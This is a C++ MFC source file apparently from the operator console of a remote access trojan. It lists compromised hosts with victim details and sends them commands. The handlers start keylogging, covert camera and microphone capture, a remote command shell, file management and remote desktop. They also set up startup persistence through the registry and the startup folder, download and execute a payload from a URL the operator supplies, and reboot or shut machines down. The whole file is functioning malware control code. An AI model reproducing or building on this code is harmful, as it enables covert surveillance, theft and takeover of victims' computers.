#include "stdafx.h"
#include "ClientList.h"
#include "KernelSrv.h"
#include "MsgHandler.h"
#include "Resource.h"
#include "EditCommentDlg.h"
#include "UrlInputDlg.h"
#include "FileSelectDlg.h"
CClientList::CClientList()
{
}


CClientList::~CClientList()
{
}
BEGIN_MESSAGE_MAP(CClientList, CListCtrl)
	ON_MESSAGE(WM_CLIENT_LOGIN, OnClientLogin)
	ON_MESSAGE(WM_CLIENT_LOGOUT, OnClientLogout)
	ON_MESSAGE(WM_CLIENT_EDITCOMMENT, OnEditComment)
	ON_WM_CREATE()
	ON_NOTIFY_REFLECT(NM_RCLICK, &CClientList::OnNMRClick)
	ON_COMMAND(ID_POWER_REBOOT, &CClientList::OnPowerReboot)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CClientList::OnPowerShutdown)
	ON_COMMAND(ID_SESSION_DISCONNECT, &CClientList::OnSessionDisconnect)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CClientList::OnOperationEditcomment)

	ON_COMMAND(ID_OPERATION_CMD, &CClientList::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CClientList::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CClientList::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CClientList::OnOperationRemotedesktop)
	ON_COMMAND(ID_OPERATION_CAMERA, &CClientList::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CClientList::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientList::OnOperationMicrophone)
	ON_COMMAND(ID_OPERATION_KEYBOARD, &CClientList::OnOperationKeyboard)
	ON_COMMAND(ID_UTILS_ADDTO, &CClientList::OnUtilsAddto)
	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CClientList::OnUtilsCopytostartup)
	ON_MESSAGE(WM_KERNEL_ERROR, OnKernelError)
	ON_MESSAGE(WM_KERNEL_UPDATE_UPLODA_STATU, OnUpdateUploadStatu)
	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CClientList::OnUtilsDownloadandexec)
END_MESSAGE_MAP()


int CClientList::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CListCtrl::OnCreate(lpCreateStruct) == -1)
		return -1;

	// TODO:  在此添加您专用的创建代码
	//LVS_EX_GRIDLINES,分隔线
	//LVS_EX_CHECKBOXES 复选框
	//LVS_EX_FULLROWSELECT选择整列
	//LVS_EX_AUTOCHECKSELECT自动选择复选框;
	//LVS_SINGLESEL 取消单行限制
	DWORD dwExStyle = GetExStyle();
	ModifyStyle(LVS_SINGLESEL, 0);
	dwExStyle |= LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_AUTOCHECKSELECT | LVS_EX_CHECKBOXES;
	SetExtendedStyle(dwExStyle);
	//左对齐
	InsertColumn(0, L"IP", LVCFMT_LEFT, 160);
	InsertColumn(1, L"Private IP", LVCFMT_LEFT, 120);		//OK
	InsertColumn(2, L"Host", LVCFMT_LEFT, 100);				//OK
	InsertColumn(3, L"User", LVCFMT_LEFT, 100);				//OK
	InsertColumn(4, L"OS", LVCFMT_LEFT, 110);				//OK
	InsertColumn(5, L"InstallDate", LVCFMT_LEFT, 110);		//--
	InsertColumn(6, L"CPU", LVCFMT_LEFT, 120);				//OK
	InsertColumn(7, L"Disk/RAM", LVCFMT_LEFT, 120);			//OK
	InsertColumn(8, L"HasCamera", LVCFMT_LEFT, 100);		//OK
	InsertColumn(9, L"Ping", LVCFMT_LEFT, 70);				//OK
	InsertColumn(10, L"Comment", LVCFMT_LEFT, 150);			//---
	InsertColumn(11, L"", LVCFMT_LEFT, 300);			//---
	return 0;
}

LRESULT CClientList::OnClientLogin(WPARAM wParam, LPARAM lParam)
{
	CKernelSrv*pHandler = (CKernelSrv*)wParam;
	CKernelSrv::LoginInfo*pLoginInfo = (CKernelSrv::LoginInfo*)lParam;
	CString Text;
	int idx = GetItemCount();

	CString sItem;
	sItem.Format(TEXT("%s"), pHandler->GetLocation().GetBuffer());
	//显示目标主机信息
	//IP
	InsertItem(idx, sItem);
	//Private IP
	SetItemText(idx, 1, pLoginInfo->szPrivateIP);
	//Host
	SetItemText(idx, 2, pLoginInfo->szHostName);
	
	SetItemText(idx, 3, pLoginInfo->szUser);

	SetItemText(idx, 4, pLoginInfo->szOsName);
	
	SetItemText(idx, 5, pLoginInfo->szInstallDate);
	
	SetItemText(idx, 6, pLoginInfo->szCPU);
	
	SetItemText(idx, 7, pLoginInfo->szDisk_RAM);
	//Camera
	Text.Format(L"%d", pLoginInfo->dwHasCamera);
	SetItemText(idx, 8, Text);
	//Ping
	if (pLoginInfo->dwPing != -1)
		Text.Format(L"%d ms", pLoginInfo->dwPing);
	else
		Text.Format(L"-");
	SetItemText(idx, 9, Text);
	//Comment
	SetItemText(idx, 10, pLoginInfo->szComment);
	//
	SetItemText(idx, 11, TEXT(""));
	//保存Handler
	SetItemData(idx, (DWORD_PTR)pHandler);
	return 0;
}

LRESULT CClientList::OnClientLogout(WPARAM wParam, LPARAM lParam)
{
	//CMsgHandler*pHandler = (CMsgHandler*)wParam;
	LVFINDINFO fi = { 0 };
	fi.flags = LVFI_PARAM;
	fi.lParam = wParam;
	int index = FindItem(&fi);

	if (index >= 0){
		DeleteItem(index);
	}
	return 0;
}

#include "utils.h"
LRESULT CClientList::OnUpdateUploadStatu(WPARAM wParam, LPARAM lParam){
	LPVOID * ArgList = (LPVOID*)lParam;
	TCHAR szModuleSize[64], szFinishedSize[64];
	CMsgHandler* pHandler = (CMsgHandler*)ArgList[0];
	CString ModuleName = CA2W((char*)ArgList[1]).m_psz;
	LARGE_INTEGER  ModuleSize = { 0 }, FinishedSize = { 0 };
	//
	ModuleSize.LowPart= (DWORD)ArgList[2];
	FinishedSize.LowPart = (DWORD)ArgList[3];

	GetStorageSizeString(ModuleSize, szModuleSize);
	GetStorageSizeString(FinishedSize, szFinishedSize);
	//
	LVFINDINFO fi = { 0 };
	fi.flags = LVFI_PARAM;
	fi.lParam = (LPARAM)pHandler;
	int index = FindItem(&fi);

	if (index >= 0){
		CString Statu;
		Statu.Format(TEXT("%s : %s/%s (%.2lf%%)"), ModuleName.GetBuffer(),
			szFinishedSize, szModuleSize, 100.00 * FinishedSize.LowPart / ModuleSize.LowPart);

		SetItemText(index, 11, Statu);
	}
	return 0;
}

LRESULT CClientList::OnEditComment(WPARAM wParam, LPARAM lParam)
{
	LVFINDINFO fi = { 0 };
	fi.flags = LVFI_PARAM;
	fi.lParam = wParam;
	int index = FindItem(&fi);

	if (index >= 0){
		SetItemText(index, 10, (TCHAR*)lParam);
	}
	return 0;
}

LRESULT CClientList::OnKernelError(WPARAM error, LPARAM lParam){

	CString IP = CA2W((char*)lParam);
	MessageBox((TCHAR*)error, IP,MB_ICONWARNING|MB_OK);
	return 0;
}

void CClientList::OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  在此添加控件通知处理程序代码
	*pResult = 0;

	CMenu*pMenu = GetParent()->GetMenu()->GetSubMenu(1);
	POINT pt;
	GetCursorPos(&pt);
	pMenu->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, this);	//阻塞.
}



void CClientList::OnPowerReboot()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Power_Reboot();
	}
}


void CClientList::OnPowerShutdown()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Power_Shutdown();
	}
}


void CClientList::OnSessionDisconnect()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos){
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginExit();
		//pHandler->Disconnect();
	}
}


void CClientList::OnOperationEditcomment()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	if (!pos)
		return;
	CEditCommentDlg dlg;
	if (dlg.DoModal() != IDOK)
		return;

	pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->EditComment(dlg.m_Comment.GetBuffer());
	}
}


void CClientList::OnOperationCmd()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginCmd();
	}
}


void CClientList::OnOperationChatbox()
{
	// TODO:  在此添加命令处理程序代码
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginChat();
	}
}

void CClientList::OnOperationFilemanager()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginFileMgr();
	}
}


void CClientList::OnOperationRemotedesktop()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginRemoteDesktop();
	}
}


void CClientList::OnOperationCamera()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginCamera();
	}
}


void CClientList::OnSessionRestart()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->Restart();
	}
}


void CClientList::OnOperationMicrophone()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginMicrophone();
	}
}





void CClientList::OnOperationKeyboard()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginKeyboardLog();
	}
}


void CClientList::OnUtilsAddto()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->UtilsWriteStartupReg();
	}

}


void CClientList::OnUtilsCopytostartup()
{
	POSITION pos = GetFirstSelectedItemPosition();
	while (pos)
	{
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->UtilsCopyToStartupMenu();
	}
}


void CClientList::OnUtilsDownloadandexec()
{
	// TODO:  在此添加命令处理程序代码
	POSITION pos = GetFirstSelectedItemPosition();
	if (!pos)
		return;
	CUrlInputDlg dlg;
	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == NULL)
		return;
	//可能在DoModal返回之后ClientList里面的东西变了...
	pos = GetFirstSelectedItemPosition();
	while (pos){
		int CurSelIdx = GetNextSelectedItem(pos);
		CKernelSrv*pHandler = (CKernelSrv*)GetItemData(CurSelIdx);
		pHandler->BeginDownloadAndExec(dlg.m_Url.GetBuffer());
	}
}
